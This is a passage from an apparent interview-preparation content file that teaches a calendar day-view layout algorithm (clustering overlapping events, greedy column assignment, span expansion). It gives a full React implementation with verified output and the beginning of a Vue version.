- A tricky test set: a chain of overlaps, an event touching a cluster boundary, equal start times, an event that can span two columns.
- Complexity: O(n log n) sort plus a sweep; fine for a day of events.

**Clarifying questions expected:**
- "Do touching events (end equals start) count as overlapping?"
- "Should a lone event in a busy cluster expand to the right, or keep its narrow column?"
- "Are there all-day or multi-day events, and what is the visible time range?"

**Code / implementation expected:** Yes. The layout function plus a rendered day view; verifying no two boxes overlap is a plus.`,
    frameworks: {
      react: {
        answer: `**Target Audience:** Frontend candidates preparing for a machine coding round. Assumes basic React; no algorithms background beyond sorting.
**Difficulty:** Hard

> **How to read this doc:** Plain words first, then a <code>📌 Interview term:</code> callout with the exact vocabulary. All "Verified" output was printed by the real code: the layout function run directly in Node 22, and the full component mounted with React 19.3.1 in StrictMode inside jsdom and driven by a script.

## 1. Why This Even Matters — A Story First

Picture a shared meeting room whiteboard where everyone writes their meeting as a strip of paper taped at the right height for its time. When two meetings overlap, the second person tapes their strip next to the first instead of on top. By lunch the board is a mess of strips of random widths, some covering others, because everyone made a local decision.

A calendar day view solves this globally. It looks at all of the day's events, groups the ones that collide, decides how many lanes each group needs, puts every event in a lane, and lets an event widen when the lanes beside it are free. That is a real algorithm, and interviewers ask for it because the rendering is easy and the layout is not.

## 2. Questions to Ask Your Interviewer First

| Question | Why it matters |
| :--- | :--- |
| Do events that touch (10:30 end, 10:30 start) overlap? | Decides \`<\` vs \`<=\` in the overlap test. Calendars treat touching as free; so does this solution. |
| Should events expand into free columns to the right? | Expansion is extra work but is what Google Calendar style views do. |
| Visible hours and minimum box height? | Positions are \`(start - dayStart) * pxPerMinute\`; a 5-minute event needs a minimum height to stay clickable. |
| All-day or multi-day events? | They belong in a separate strip above the timeline, not in the packing. |
| How many events per day? | Dozens: an O(n log n) sweep is plenty. Thousands would push towards virtualisation. |
| Can events be dragged or resized? | Out of scope here, but it means the layout must be a pure function that re-runs on every change. |

## 3. Requirements and Plan

The whole problem splits into a pure layout function and a thin view:

| Piece | Kind | Notes |
| :--- | :--- | :--- |
| \`events\` | State | \`{ id, title, start, end }\`, times in minutes since midnight. |
| \`placed\` | Derived with \`useMemo\` | \`layoutDay(events)\`: each event plus \`col\`, \`cols\`, \`span\`. |
| \`selectedId\` | State | Which event shows in the details panel. |
| \`form\`, \`error\` | State | The add-event form. |
| \`nextId\` | Ref | Id counter; must not cause renders. |

📌 **Interview term: Pure layout function** — a function that takes data and returns positions, with no DOM access and no state. It can be unit-tested in Node, reused by every framework, and memoised by its input.

The algorithm has four steps:

<svg class="iq-diagram" width="100%" viewBox="0 0 700 130" role="img" aria-label="Algorithm pipeline: sort by start, sweep into clusters, assign greedy columns, expand right into free columns">
  <defs>
    <marker id="dv3r-arrow" markerWidth="8" markerHeight="8" refX="5" refY="3" orient="auto">
      <path class="d-arrow" d="M0,0 L7,3 L0,6 Z"/>
    </marker>
  </defs>
  <rect class="d-box-muted" x="10" y="35" width="140" height="60" rx="10"/>
  <text class="d-text" x="80" y="60" text-anchor="middle">1. Sort</text>
  <text class="d-sub" x="80" y="80" text-anchor="middle">start, longer first</text>
  <rect class="d-box" x="190" y="35" width="140" height="60" rx="10"/>
  <text class="d-text" x="260" y="60" text-anchor="middle">2. Clusters</text>
  <text class="d-sub" x="260" y="80" text-anchor="middle">sweep by max end</text>
  <rect class="d-box" x="370" y="35" width="140" height="60" rx="10"/>
  <text class="d-text" x="440" y="60" text-anchor="middle">3. Columns</text>
  <text class="d-sub" x="440" y="80" text-anchor="middle">first free lane</text>
  <rect class="d-box-accent" x="550" y="35" width="140" height="60" rx="10"/>
  <text class="d-text d-accent" x="620" y="60" text-anchor="middle">4. Expand</text>
  <text class="d-sub" x="620" y="80" text-anchor="middle">span free lanes</text>
  <path class="d-edge-accent" d="M 150 65 L 186 65" marker-end="url(#dv3r-arrow)"/>
  <path class="d-edge-accent" d="M 330 65 L 366 65" marker-end="url(#dv3r-arrow)"/>
  <path class="d-edge-accent" d="M 510 65 L 546 65" marker-end="url(#dv3r-arrow)"/>
</svg>

Each step is a few lines; the next section walks through them on a deliberately tricky day.

## 4. Build It Step by Step

### 4.1 Overlap, and the tricky test day

\`\`\`js
// touching is not overlapping
export const overlaps = (a, b) => a.start < b.end && b.start < a.end;
\`\`\`

Two intervals overlap when each starts before the other ends. Strict \`<\` means 09:00 to 10:30 and 10:30 to 11:30 do not overlap.

📌 **Interview term: Interval overlap test** — \`a.start < b.end && b.start < a.end\`. It covers every arrangement (containment, partial, identical) in one expression, which is why it is worth memorising.

The sample data is chosen to break naive solutions:

| Id | Event | Time | What it tests |
| :--- | :--- | :--- | :--- |
| a | Planning | 09:00 to 10:30 | Long event at the start of a chain |
| b | 1:1 Sam | 09:30 to 10:00 | Nested inside \`a\` |
| c | Design review | 09:45 to 11:00 | Overlaps both, forces a third column |
| d | Standup | 10:30 to 11:30 | Touches \`a\`, so it can reuse column 0 |
| e | Interview | 11:00 to 12:00 | Touches \`c\`; overlaps \`d\`; can expand over two columns |
| f | Lunch | 12:00 to 13:00 | Touches the cluster end: a new cluster, full width |
| g, h | Workshop, Call | both 13:30 | Equal starts: the longer one goes first |
| i | Focus time | 14:00 to 15:00 | Reuses the column \`h\` frees at 14:00 |

### 4.2 Sort, sweep, assign

\`\`\`js
export function layoutDay(events) {
  const sorted = [...events].sort(
    (a, b) =>
      a.start - b.start || b.end - a.end || (a.id < b.id ? -1 : 1),
  );
  const placed = [];
  let columns = [],
    members = [],
    clusterEnd = -1;

  const close = () => {
    /* step 4, below */
  };

  for (const ev of sorted) {
    // nothing open overlaps: the cluster is done
    if (ev.start >= clusterEnd) close();
    let col = columns.findIndex((c) => c[c.length - 1].end <= ev.start);
    if (col === -1) {
      col = columns.length;
      columns.push([]);
    }
    columns[col].push(ev);
    members.push({ ev, col });
    clusterEnd = Math.max(clusterEnd, ev.end);
  }
  close();
  return placed;
}
\`\`\`

📌 **Interview term: Cluster (connected component)** — a maximal group of events linked by overlaps, directly or through a chain. \`a\` overlaps \`c\`, \`c\` overlaps \`d\` and \`e\`, so \`a\` to \`e\` form one cluster even though \`a\` and \`e\` never touch. The sweep finds clusters in one pass by tracking the latest end seen: when the next event starts at or after it, nothing open can overlap, so the cluster closes.

📌 **Interview term: Greedy interval colouring** — process intervals by start time and put each into the first column whose last interval has already ended. For intervals sorted by start, this uses the minimum possible number of columns (the maximum number of events overlapping at any instant).

The tie-break \`b.end - a.end\` puts the longer of two equal-start events first, so the long one gets the leftmost column, which reads better. The final \`id\` comparison makes the order deterministic.

### 4.3 Share the column count, then expand

\`\`\`js
const close = () => {
  for (const p of members) {
    let span = 1;
    while (
      p.col + span < columns.length &&
      !columns[p.col + span].some((o) => overlaps(o, p.ev))
    )
      span++;
    placed.push({ ...p.ev, col: p.col, cols: columns.length, span });
  }
  columns = [];
  members = [];
  clusterEnd = -1;
};
\`\`\`

Every event in a cluster is drawn with the cluster's column count. If \`d\` used its own local count instead, it would be half width while \`c\` beside it is a third, and they would collide. Expansion then walks right while the neighbouring column has nothing that overlaps this event. \`e\` sits in column 1; column 2 only holds \`c\`, which ends exactly when \`e\` starts, so \`e\` spans two columns.

<svg class="iq-diagram" width="100%" viewBox="0 0 640 290" role="img" aria-label="Resulting layout of the first cluster: Planning and Standup in column zero, 1 to 1 and Interview in column one, Design review in column two, Interview spanning columns one and two">
  <text class="d-sub" x="20" y="44">09:00</text>
  <text class="d-sub" x="20" y="116">10:00</text>
  <text class="d-sub" x="20" y="188">11:00</text>
  <text class="d-sub" x="20" y="260">12:00</text>
  <rect class="d-box-muted" x="90" y="40" width="150" height="108" rx="6"/>
  <text class="d-text" x="165" y="66" text-anchor="middle">a Planning</text>
  <rect class="d-box-muted" x="265" y="76" width="150" height="36" rx="6"/>
  <text class="d-text" x="340" y="99" text-anchor="middle">b 1:1</text>
  <rect class="d-box-muted" x="440" y="94" width="150" height="90" rx="6"/>
  <text class="d-text" x="515" y="130" text-anchor="middle">c Design</text>
  <rect class="d-box" x="90" y="152" width="150" height="68" rx="6"/>
  <text class="d-text" x="165" y="180" text-anchor="middle">d Standup</text>
  <rect class="d-box-accent" x="265" y="188" width="325" height="68" rx="6"/>
  <text class="d-text d-accent" x="427" y="216" text-anchor="middle">e Interview, span 2</text>
  <text class="d-sub" x="427" y="238" text-anchor="middle">columns 1 and 2</text>
</svg>

Column 0 is reused by \`d\` because \`a\` ends at 10:30; \`e\` widens over the space \`c\` leaves at 11:00. (The \`d\` box is drawn a few units short of \`a\` only to keep them visually apart; in the data they touch.)

### 4.4 Render positions from the layout

\`\`\`jsx
const placed = useMemo(() => layoutDay(events), [events]);
// ...
<button type="button" className={"ev" + (ev.id === selectedId ? " sel" : "")} data-id={ev.id}
  data-col={ev.col} data-cols={ev.cols} data-span={ev.span} aria-pressed={ev.id === selectedId}
  aria-label={\`\${ev.title}, \${fmt(ev.start)} to \${fmt(ev.end)}\`}
  style={{ top: (ev.start - DAY_START) * PX_PER_MIN, height: Math.max((ev.end - ev.start) * PX_PER_MIN, 20),
    left: pct(ev.col / ev.cols), width: pct(ev.span / ev.cols) }}
  onClick={() => setSelectedId(ev.id === selectedId ? null : ev.id)}>
\`\`\`

\`left\` and \`width\` are percentages of the event column, so the layout is responsive for free: at 360 px the boxes are narrower, never overlapping. The events render in \`placed\` order, which is start order, so Tab visits them chronologically.

📌 **Interview term: useMemo** — caches a computed value until its dependencies change ([useMemo vs useCallback](/interview-question/what-is-the-difference-between-usememo-and-usecallback)). Here it is mostly documentation: the layout is cheap, but it states that \`placed\` is derived from \`events\` and nothing else.

### 4.5 Adding events, and a StrictMode lesson

The first draft of \`add\` did this:

\`\`\`js
setEvents((list) => [
  ...list,
  { id: "n" + nextId.current++, title: form.title.trim(), start, end },
]);
\`\`\`

The driver's output showed the new event as \`n2\`, not \`n1\`. In development StrictMode, React calls state updater functions twice to surface impure updaters, and this one had a side effect (\`nextId.current++\`). The fix takes the id outside the updater:

\`\`\`js
const id = "n" + nextId.current++;
setEvents((list) => [
  ...list,
  { id, title: form.title.trim(), start, end },
]);
\`\`\`

📌 **Interview term: Pure updater function** — a \`setState(fn)\` callback must compute the next state from the previous one and nothing else, because React may call it more than once ([immutable state updates](/interview-question/why-must-react-state-updates-be-immutable)).

Validation is three early returns: a title, \`end > start\`, and the event inside 08:00 to 19:00, each writing a message into a \`role="alert"\` paragraph.

## 5. Verified

First, the pure function in Node 22 on the sample day, plus a comparison with a naive layout that gives each event \`1 / (number of events it overlaps + 1)\` of the width:

\`\`\`text
a Planning      09:00-10:30  col 0/3 span 1
b 1:1 Sam       09:30-10:00  col 1/3 span 1
c Design review 09:45-11:00  col 2/3 span 1
d Standup       10:30-11:30  col 0/3 span 1
e Interview     11:00-12:00  col 1/3 span 2
f Lunch         12:00-13:00  col 0/1 span 1
g Workshop      13:30-14:30  col 0/2 span 1
h Call          13:30-14:00  col 1/2 span 1
i Focus time    14:00-15:00  col 1/2 span 1
packed layout collisions: none
naive layout collisions : bc,cd,de
\`\`\`

The collision check tests every pair of time-overlapping events for horizontal intersection. The packed layout has none; the naive one draws \`b\` over \`c\`, \`c\` over \`d\` and \`d\` over \`e\`.

Then the component, mounted in jsdom with React 19.3.1 in StrictMode and driven by a script (same driver for Vue and Angular, same output). jsdom has no layout, so the driver read each box from its inline \`top\`, \`height\`, \`left\` and \`width\` and ran the same pairwise check:

\`\`\`text
layout: a:0/3 b:1/3 c:2/3 d:0/3 e:1/3x2 f:0/1 g:0/2 h:1/2 i:1/2
  overlapping boxes: none
Interview box: top 180px height 60px left 33.3333% width 66.6667% | Interview, 11:00 to 12:00
Tab order: a b c d e f g h i
add Sync 09:15-09:45: a:0/3 n1:1/3 b:2/3 c:1/3 d:0/3 e:1/3x2 f:0/1 g:0/2 h:1/2 i:1/2
  overlapping boxes: none
invalid add -> End time must be after the start time. | events: 10
out of hours -> Events must fit between 08:00 and 19:00.
select Interview -> Interview11:00 to 12:00Delete event | aria-pressed: true
delete Interview: a:0/3 n1:1/3 b:2/3 c:1/3 d:0/3 f:0/1 g:0/2 h:1/2 i:1/2
  overlapping boxes: none
details -> Select an event to see details.
\`\`\`

\`e:1/3x2\` reads "column 1 of 3, spanning 2". Adding Sync (09:15 to 09:45) moved \`b\` to column 2 and let \`c\` take column 1, which Sync frees at 09:45, without changing the cluster's three columns. Deleting Interview removed it, and the remaining layout stayed collision-free. The visual result (colours, the 360 px width) was not checked here; the geometry was.

## 6. Edge Cases and Accessibility

| Concern | Handling |
| :--- | :--- |
| Touching events | Strict \`<\` overlap; \`d\` reuses column 0, \`f\` starts a new cluster |
| Equal starts | Longer first, then by id: deterministic |
| Very short events | \`Math.max(height, 20)\` keeps a clickable box |
| Event outside visible hours | Rejected by the form with a message |
| Keyboard | Every event is a \`button\`, in time order; \`aria-pressed\` shows selection |
| Screen reader | \`aria-label\` "Interview, 11:00 to 12:00"; the list is \`role="list"\` named "Events, in time order"; details are a polite live region |
| Hour labels | \`aria-hidden\`: they are decoration, the times are in each label |

## 7. Common Pitfalls

- **Width from "how many events overlap me".** Verified above: it collides three times on the sample day. Columns must be assigned per cluster.
- **Per-event column counts.** Every event in a cluster must use the cluster's count, or neighbours of different widths overlap.
- **\`<=\` in the overlap test.** Then 10:30 to 10:30 counts as overlapping and the view wastes a column on back-to-back meetings.
- **Ending a cluster when the previous event ends.** You must compare with the maximum end so far: \`a\` (to 10:30) keeps the cluster open after \`b\` ends at 10:00.
- **Side effects inside a state updater.** StrictMode ran it twice and skipped an id.
- **Absolute pixel \`left\` / \`width\`.** Percentages adapt to any container width.

## 8. How to Answer in an Interview

<div style="background:#1c140a;border:2px solid #f9a825;border-radius:10px;padding:20px 24px;margin:20px 0;">

<div style="color:#ffca28;font-size:1.15em;font-weight:bold;margin-bottom:16px;">🎤 How to Answer in an Interview</div>

<div style="color:#e0a83e;font-size:0.8em;font-weight:bold;text-transform:uppercase;letter-spacing:0.6px;margin:0 0 10px 0;">The 60-Second Answer</div>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">1. Model:</strong> <span style="color:#f0e2c8;">"Events are minutes since midnight, and the layout is a pure function returning <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">col</code>, <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">cols</code> and <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">span</code> for each event, derived with <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">useMemo</code>."</span>
</blockquote>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">2. Clusters:</strong> <span style="color:#f0e2c8;">"Sort by start with longer first on ties, then sweep: when an event starts at or after the latest end so far, the current cluster is closed."</span>
</blockquote>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">3. Columns:</strong> <span style="color:#f0e2c8;">"Inside a cluster, put each event in the first column whose last event has ended, which is greedy interval colouring."</span>
</blockquote>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">4. Expand:</strong> <span style="color:#f0e2c8;">"Every event uses the cluster column count, then widens right while the next column has nothing overlapping it."</span>
</blockquote>

<blockquote style="border-left:3px solid #f9a825;margin:10px 0;padding:2px 0 2px 14px;color:#f0e2c8;">
<strong style="color:#ffca28;">5. Render:</strong> <span style="color:#f0e2c8;">"<code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">top</code> and <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">height</code> from minutes, <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">left</code> and <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">width</code> as percentages, events as buttons in time order with full labels."</span>
</blockquote>

<div style="color:#e0a83e;font-size:0.8em;font-weight:bold;text-transform:uppercase;letter-spacing:0.6px;margin:22px 0 10px 0;border-top:1px solid #4a3a1a;padding-top:16px;">Follow-Up Questions to Expect</div>

<div style="background:#3d2810;border-radius:8px 8px 0 0;padding:10px 16px;margin:12px 0 0 0;">
<span style="color:#ff8a65;font-weight:bold;">❓ Q:</span> <span style="color:#ffe0b2;">What is the complexity?</span>
</div>
<div style="background:#151a15;border:1px solid #f9a825;border-top:none;border-radius:0 0 8px 8px;padding:10px 16px;margin:0 0 14px 0;">
<span style="color:#66bb6a;font-weight:bold;">💡 A:</span> <span style="color:#d8d8d8;">Sorting is O(n log n). The sweep checks each column per event, and expansion checks columns per event, so it is O(n times columns) after the sort; for a day of events that is tiny.</span>
</div>

<div style="background:#3d2810;border-radius:8px 8px 0 0;padding:10px 16px;margin:0;">
<span style="color:#ff8a65;font-weight:bold;">❓ Q:</span> <span style="color:#ffe0b2;">How would you support drag to move or resize?</span>
</div>
<div style="background:#151a15;border:1px solid #f9a825;border-top:none;border-radius:0 0 8px 8px;padding:10px 16px;margin:0 0 14px 0;">
<span style="color:#66bb6a;font-weight:bold;">💡 A:</span> <span style="color:#d8d8d8;">Keep a draft copy of the dragged event in state, snap to 15 minutes, and re-run <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">layoutDay</code> on the draft list each frame; commit to the real list on drop. The pure function makes this easy.</span>
</div>

<div style="background:#3d2810;border-radius:8px 8px 0 0;padding:10px 16px;margin:0;">
<span style="color:#ff8a65;font-weight:bold;">❓ Q:</span> <span style="color:#ffe0b2;">Is greedy column assignment optimal?</span>
</div>
<div style="background:#151a15;border:1px solid #f9a825;border-top:none;border-radius:0 0 8px 8px;padding:10px 16px;margin:0 0 14px 0;">
<span style="color:#66bb6a;font-weight:bold;">💡 A:</span> <span style="color:#d8d8d8;">For intervals sorted by start it uses the minimum number of columns, equal to the peak number of simultaneous events. Expansion is a heuristic for width, not part of that guarantee.</span>
</div>

<div style="background:#3d2810;border-radius:8px 8px 0 0;padding:10px 16px;margin:0;">
<span style="color:#ff8a65;font-weight:bold;">❓ Q:</span> <span style="color:#ffe0b2;">How would you add a current-time line?</span>
</div>
<div style="background:#151a15;border:1px solid #f9a825;border-top:none;border-radius:0 0 8px 8px;padding:10px 16px;margin:0 0 14px 0;">
<span style="color:#66bb6a;font-weight:bold;">💡 A:</span> <span style="color:#d8d8d8;">An absolutely positioned line at <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">(now - dayStart) * pxPerMinute</code>, updated by an interval every minute with cleanup in the effect, and <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">aria-hidden</code> because it is visual.</span>
</div>

<div style="background:#3d2810;border-radius:8px 8px 0 0;padding:10px 16px;margin:0;">
<span style="color:#ff8a65;font-weight:bold;">❓ Q:</span> <span style="color:#ffe0b2;">How would you test it?</span>
</div>
<div style="background:#151a15;border:1px solid #f9a825;border-top:none;border-radius:0 0 8px 8px;padding:10px 16px;margin:0;">
<span style="color:#66bb6a;font-weight:bold;">💡 A:</span> <span style="color:#d8d8d8;">Unit-test <code style="background:#332310;color:#ffca28;padding:1px 5px;border-radius:3px;">layoutDay</code> with a table of tricky cases plus a property test: for random events, no two overlapping events share horizontal space. Component tests only check that styles follow the layout.</span>
</div>

</div>

## 9. Quick Glossary

| Term | Plain meaning |
| :--- | :--- |
| **Pure layout function** | Data in, positions out, no DOM or state |
| **Interval overlap test** | \`a.start < b.end && b.start < a.end\` |
| **Cluster (connected component)** | Events linked by a chain of overlaps |
| **Greedy interval colouring** | First free column for each event in start order |
| **Span expansion** | Widening into free neighbouring columns |
| **useMemo** | Cache a derived value until its inputs change |
| **Pure updater function** | A \`setState\` callback with no side effects |

---
**Conclusion:** A day view is a layout algorithm with a thin UI on top. Sort, sweep into clusters by the running maximum end, assign the first free column, share the cluster's column count, and expand into free columns; render the result as percentages. The verified run proves it on a day built to break naive layouts: zero collisions for the packed layout versus three for the naive one, a two-column expansion, and a layout that stays correct as events are added and deleted.`,
        files: {
          "/App.js": `import DayView from "./src/DayView";

const css = \`
  body { margin: 0; background: #0f1115; color: #e6e6e6; font-family: system-ui, sans-serif; }
  .page { max-width: 860px; margin: 0 auto; padding: 20px 16px; }
  .dv h2 { font-size: 17px; margin: 0 0 12px; }
  .dv-body { display: flex; flex-wrap: wrap; gap: 16px; }
  .dv-grid { position: relative; flex: 1 1 320px; min-width: 0; margin-top: 8px; }
  .dv-hour { position: absolute; left: 0; right: 0; border-top: 1px solid #262c36; }
  .dv-hour span { position: absolute; top: -8px; left: 0; font-size: 11px; color: #7d8590; background: #0f1115; padding-right: 4px; }
  .dv-events { position: absolute; top: 0; bottom: 0; left: 48px; right: 4px; }
  .ev { position: absolute; box-sizing: border-box; border: 1px solid #0f1115; border-left: 3px solid #f9a825; border-radius: 6px;
    background: #2a2214; color: #f0e2c8; text-align: left; padding: 2px 6px; font: 12px/1.3 system-ui, sans-serif; overflow: hidden; cursor: pointer; }
  .ev span { color: #c9b48a; }
  .ev.sel { background: #f9a825; color: #1c140a; } .ev.sel span { color: #3d2810; }
  .ev:focus-visible { outline: 2px solid #fff; outline-offset: 1px; z-index: 2; }
  .dv-side { flex: 1 1 220px; display: flex; flex-direction: column; gap: 16px; }
  .dv-side section, .dv-side form { background: #171a21; border: 1px solid #2c3340; border-radius: 10px; padding: 12px; }
  .dv-side h3 { margin: 0 0 4px; font-size: 15px; } .dv-side p { margin: 4px 0; }
  .muted { color: #8b949e; font-size: 14px; }
  form { display: flex; flex-direction: column; gap: 8px; }
  label { display: flex; flex-direction: column; font-size: 12px; color: #9aa4b2; gap: 4px; }
  input { background: #0f1115; color: #e6e6e6; border: 1px solid #2c3340; border-radius: 6px; padding: 6px 8px; font: inherit; color-scheme: dark; }
  button { font: inherit; }
  .dv-side button { background: #222834; color: #e6e6e6; border: 1px solid #2c3340; border-radius: 8px; padding: 6px 12px; cursor: pointer; }
  .err { color: #ff8a80; font-size: 13px; }
\`;

export default function App() {
  return (
    <main className="page">
      <style>{css}</style>
      <DayView />
    </main>
  );
}
`,
          "/src/DayView.js": `import { useMemo, useRef, useState } from "react";
import {
  DAY_END,
  DAY_START,
  SAMPLE,
  fmt,
  layoutDay,
  pct,
  toMin,
} from "./layout";

const PX_PER_MIN = 1; // 60px per hour
const HOURS = Array.from(
  { length: (DAY_END - DAY_START) / 60 + 1 },
  (_, i) => DAY_START + i * 60,
);

export default function DayView() {
  const [events, setEvents] = useState(SAMPLE);
  const [selectedId, setSelectedId] = useState(null);
  const [form, setForm] = useState({ title: "", start: "09:15", end: "09:45" });
  const [error, setError] = useState("");
  const nextId = useRef(1);

  // Derived, never stored: recomputed only when the events array changes.
  const placed = useMemo(() => layoutDay(events), [events]);
  const selected = events.find((e) => e.id === selectedId);

  function add(e) {
    e.preventDefault();
    const start = toMin(form.start),
      end = toMin(form.end);
    if (!form.title.trim()) return setError("Give the event a title.");
    if (end <= start) return setError("End time must be after the start time.");
    if (start < DAY_START || end > DAY_END)
      return setError(
        \`Events must fit between \${fmt(DAY_START)} and \${fmt(DAY_END)}.\`,
      );
    // Take the id OUTSIDE the updater: StrictMode
    // calls updaters twice in development.
    const id = "n" + nextId.current++;
    setEvents((list) => [
      ...list,
      { id, title: form.title.trim(), start, end },
    ]);
    setForm((f) => ({ ...f, title: "" }));
    setError("");
  }
  function remove(id) {
    setEvents((list) => list.filter((e) => e.id !== id));
    setSelectedId(null);
  }

  return (
    <div className="dv">
      <h2>Thursday, March 12, 2026</h2>
      <div className="dv-body">
        <div
          className="dv-grid"
          style={{ height: (DAY_END - DAY_START) * PX_PER_MIN }}
        >
          {HOURS.map((h) => (
            <div
              key={h}
              className="dv-hour"
              style={{ top: (h - DAY_START) * PX_PER_MIN }}
              aria-hidden="true"
            >
              <span>{fmt(h)}</span>
            </div>
          ))}
          <div
            className="dv-events"
            role="list"
            aria-label="Events, in time order"
          >
            {placed.map((ev) => (
              <div role="listitem" key={ev.id}>
                <button
                  type="button"
                  className={"ev" + (ev.id === selectedId ? " sel" : "")}
                  data-id={ev.id}
                  data-col={ev.col}
                  data-cols={ev.cols}
                  data-span={ev.span}
                  aria-pressed={ev.id === selectedId}
                  aria-label={\`\${ev.title}, \${fmt(ev.start)} to \${fmt(ev.end)}\`}
                  style={{
                    top: (ev.start - DAY_START) * PX_PER_MIN,
                    height: Math.max((ev.end - ev.start) * PX_PER_MIN, 20),
                    left: pct(ev.col / ev.cols),
                    width: pct(ev.span / ev.cols),
                  }}
                  onClick={() =>
                    setSelectedId(ev.id === selectedId ? null : ev.id)
                  }
                >
                  <strong>{ev.title}</strong>{" "}
                  <span>
                    {fmt(ev.start)}-{fmt(ev.end)}
                  </span>
                </button>
              </div>
            ))}
          </div>
        </div>
        <aside className="dv-side">
          <section aria-live="polite" data-testid="details">
            {selected ? (
              <>
                <h3>{selected.title}</h3>
                <p>
                  {fmt(selected.start)} to {fmt(selected.end)}
                </p>
                <button type="button" onClick={() => remove(selected.id)}>
                  Delete event
                </button>
              </>
            ) : (
              <p className="muted">Select an event to see details.</p>
            )}
          </section>
          <form onSubmit={add} aria-label="Add event">
            <label>
              Title{" "}
              <input
                value={form.title}
                onChange={(e) => setForm({ ...form, title: e.target.value })}
              />
            </label>
            <label>
              Start{" "}
              <input
                type="time"
                step="900"
                value={form.start}
                onChange={(e) => setForm({ ...form, start: e.target.value })}
              />
            </label>
            <label>
              End{" "}
              <input
                type="time"
                step="900"
                value={form.end}
                onChange={(e) => setForm({ ...form, end: e.target.value })}
              />
            </label>
            <button type="submit">Add event</button>
            {error && (
              <p role="alert" className="err">
                {error}
              </p>
            )}
          </form>
        </aside>
      </div>
    </div>
  );
}
`,
          "/src/layout.js": `// Column packing for one day of events. Times are minutes since midnight.
// 1. Sort by start (longer first on ties).
// 2. Sweep: a cluster is a run of events connected by overlaps. When the next
//    event starts at or after the cluster's latest end, the cluster is closed.
// 3. Inside a cluster, put each event in the first column whose last event has
//    ended (greedy interval colouring), else open a new column.
// 4. Every event in a cluster shares the cluster's column count, then expands
//    right across neighbouring columns that have nothing overlapping it.
// touching is not overlapping
export const overlaps = (a, b) => a.start < b.end && b.start < a.end;

export function layoutDay(events) {
  const sorted = [...events].sort(
    (a, b) => a.start - b.start || b.end - a.end || (a.id < b.id ? -1 : 1),
  );
  const placed = [];
  let columns = [],
    members = [],
    clusterEnd = -1;

  const close = () => {
    for (const p of members) {
      let span = 1;
      while (
        p.col + span < columns.length &&
        !columns[p.col + span].some((o) => overlaps(o, p.ev))
      )
        span++;
      placed.push({ ...p.ev, col: p.col, cols: columns.length, span });
    }
    columns = [];
    members = [];
    clusterEnd = -1;
  };

  for (const ev of sorted) {
    if (ev.start >= clusterEnd) close();
    let col = columns.findIndex((c) => c[c.length - 1].end <= ev.start);
    if (col === -1) {
      col = columns.length;
      columns.push([]);
    }
    columns[col].push(ev);
    members.push({ ev, col });
    clusterEnd = Math.max(clusterEnd, ev.end);
  }
  close();
  // same order as sorted: by start time, which is also the Tab order
  return placed;
}

export const DAY_START = 8 * 60; // 08:00
export const DAY_END = 19 * 60; // 19:00
export const toMin = (hhmm) => {
  const [h, m] = hhmm.split(":").map(Number);
  return h * 60 + m;
};
export const fmt = (min) =>
  String(Math.floor(min / 60)).padStart(2, "0") +
  ":" +
  String(min % 60).padStart(2, "0");
export const pct = (n) => +(n * 100).toFixed(4) + "%";

// A deliberately tricky day: chains, a touching
// boundary, an equal start and a span-2 expansion.
export const SAMPLE = [
  { id: "a", title: "Planning", start: toMin("09:00"), end: toMin("10:30") },
  { id: "b", title: "1:1 Sam", start: toMin("09:30"), end: toMin("10:00") },
  {
    id: "c",
    title: "Design review",
    start: toMin("09:45"),
    end: toMin("11:00"),
  },
  { id: "d", title: "Standup", start: toMin("10:30"), end: toMin("11:30") },
  { id: "e", title: "Interview", start: toMin("11:00"), end: toMin("12:00") },
  { id: "f", title: "Lunch", start: toMin("12:00"), end: toMin("13:00") },
  { id: "g", title: "Workshop", start: toMin("13:30"), end: toMin("14:30") },
  { id: "h", title: "Call", start: toMin("13:30"), end: toMin("14:00") },
  { id: "i", title: "Focus time", start: toMin("14:00"), end: toMin("15:00") },
];
`,
        },
      },
      vue: {
        answer: `**Target Audience:** Vue developers preparing for a machine coding round. Assumes \`<script setup>\`, \`ref\` and \`computed\`.
**Difficulty:** Hard

> **How to read this doc:** Plain words first, then a <code>📌 Interview term:</code> callout. "Verified" output was printed by the real code: the layout function in Node 22, and this Vue 3.5.44 component mounted in jsdom and driven by a script.

## 1. Why This Even Matters — A Story First

On a shared whiteboard, people tape strips of paper for their meetings. If everyone decides locally where to tape, strips end up covering each other. A day view decides globally: group the meetings that collide, give each group enough lanes, put each meeting in a lane, and let it widen when the lanes beside it are free. The UI is easy; the layout is the interview.

## 2. Requirements and the Vue State Model

A timeline from 08:00 to 19:00, events positioned by time and by column, no two overlapping boxes, expansion into free columns, select and delete, an add form with validation, keyboard-reachable events.

| Piece | Vue tool | Notes |
| :--- | :--- | :--- |
| \`events\` | \`ref([])\` | \`{ id, title, start, end }\` in minutes since midnight. |
| \`placed\` | \`computed(() => layoutDay(events.value))\` | The whole layout, recomputed on any change to the list. |
| \`selected\` | \`computed\` | The event shown in the details panel. |
| \`form\` | \`reactive\` | Title, start, end for \`v-model\`. |
| \`nextId\` | plain \`let\` | A counter the template never reads. |

📌 **Interview term: Pure layout function** — \`layoutDay(events)\` returns each event with \`col\`, \`cols\` and \`span\`. It touches no DOM and no reactivity, so it runs unchanged in Node, React and Angular, and \`computed\` caches it.

## 3. Build It Step by Step

### 3.1 The algorithm

\`\`\`js
// touching is not overlapping
